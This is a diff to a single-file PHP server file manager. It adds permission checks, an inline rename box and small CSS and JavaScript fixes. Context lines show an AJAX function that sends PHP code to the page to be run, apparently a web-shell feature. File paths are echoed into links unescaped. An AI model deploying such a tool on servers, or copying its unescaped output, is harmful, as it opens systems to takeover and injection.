@@ -256,10 +256,11 @@ p8C40KYRmurHGn8DyLSE2zCB6OEAAAAASUVORK5CYII=");
 <?php
         $odd = false;
         foreach($filenames as $file):
+            $filename = $file;
             if(is_dir($this->working_dir . $this->ds . $file)) {
-                $file .= $this->ds;
+                $filename .= $this->ds;
             }
-            $fullpath = realpath($this->working_dir . $this->ds . $file);
+            $fullpath = realpath($this->working_dir . $this->ds . $filename);
 
             $action = is_dir($fullpath) ? 'list' : 'download';
             $target = is_dir($fullpath) ? 'dir' : 'file';
@@ -271,7 +272,11 @@ p8C40KYRmurHGn8DyLSE2zCB6OEAAAAASUVORK5CYII=");
             <span class="text"><?php echo is_dir($fullpath) ? 'D': 'F'; ?></span>
         </td>
         <td class="filename">
-            <a href="<?php echo $this->url; ?>?action=<?php echo $action; ?>&amp;<?php echo $target; ?>=<?php echo $fullpath; ?>"><?php echo $file; ?></a>
+            <?php if(is_readable($fullpath)): ?>
+            <a href="<?php echo $this->url; ?>?action=<?php echo $action; ?>&amp;<?php echo $target; ?>=<?php echo $fullpath; ?>"><?php echo $filename; ?></a>
+            <?php else: ?>
+            <?php echo $filename; ?>
+            <?php endif; ?>
         </td>
         <td class="size">
             <?php echo number_format(filesize($fullpath)); ?>B
@@ -280,13 +285,25 @@ p8C40KYRmurHGn8DyLSE2zCB6OEAAAAASUVORK5CYII=");
             <?php echo date('Y-m-d H:i:s', filemtime($fullpath)); ?>
         </td>
         <td class="delete">
+            <?php if(is_writable($fullpath)): ?>
             <a href="<?php echo $this->url; ?>?action=delete&amp;<?php echo $target; ?>=<?php echo $fullpath; ?>" onclick="">Delete</a>
+            <?php else: ?>
+            &nbsp;
+            <?php endif; ?>
         </td>
         <td class="rename">
-            <a href="<?php echo $this->url; ?>?action=rename&amp;<?php echo $target; ?>=<?php echo $fullpath; ?>" onclick="">Rename</a>
+            <?php if(is_writable($fullpath)): ?>
+            <a href="<?php echo $this->url; ?>?action=rename&amp;<?php echo $target; ?>=<?php echo $fullpath; ?>" onclick="return rename(this, <?php var_export($file); ?>);">Rename</a>
+            <?php else: ?>
+            &nbsp;
+            <?php endif; ?>
         </td>
         <td class="edit">
+            <?php if(is_writable($fullpath)): ?>
             <a href="<?php echo $this->url; ?>?action=edit&amp;<?php echo $target; ?>=<?php echo $fullpath; ?>"><?php echo is_dir($fullpath) ? '' : 'Edit'; ?></a>
+            <?php else: ?>
+            &nbsp;
+            <?php endif; ?>
         </td>
     </tr>
 <?php
@@ -430,6 +447,10 @@ label {
     text-align: right;
 }
 
+#file_list .rename input {
+width: 7em;
+}
+
 #content {
     padding-top: 0.5em;
     clear: both;
@@ -508,13 +529,13 @@ function newXMLHTTP() {
     try {
         return new XMLHttpRequest();
     }
-    catch (e) {
+    catch (ea) {
         try {
             return new ActiveXObject("Msxml2.XMLHTTP");
-        } catch (e) {
+        } catch (eb) {
             try {
                 return new ActiveXObject("Microsoft.XMLHTTP");
-            } catch (e) {
+            } catch (ec) {
                 return false;
             }
         }
@@ -544,12 +565,26 @@ function evalPHP() {
             }
             evalButton.disabled = false;
         }
-    }
+    };
     ajax.open("POST", document.location, true);
     ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     ajax.setRequestHeader("Content-length", params.length);
     ajax.setRequestHeader("Connection", "close");
     ajax.send(params);
+}
+
+function rename(el, name) {
+    var newel = document.createElement('input');
+    newel.type = 'text';
+    newel.value = name;
+    newel.onblur = function() {
+        newel.parentNode.replaceChild(el, newel);
+    };
+
+    el.parentNode.replaceChild(newel, el);
+    newel.focus();
+
+    return false;
 }
 <?php
         return ob_get_clean();
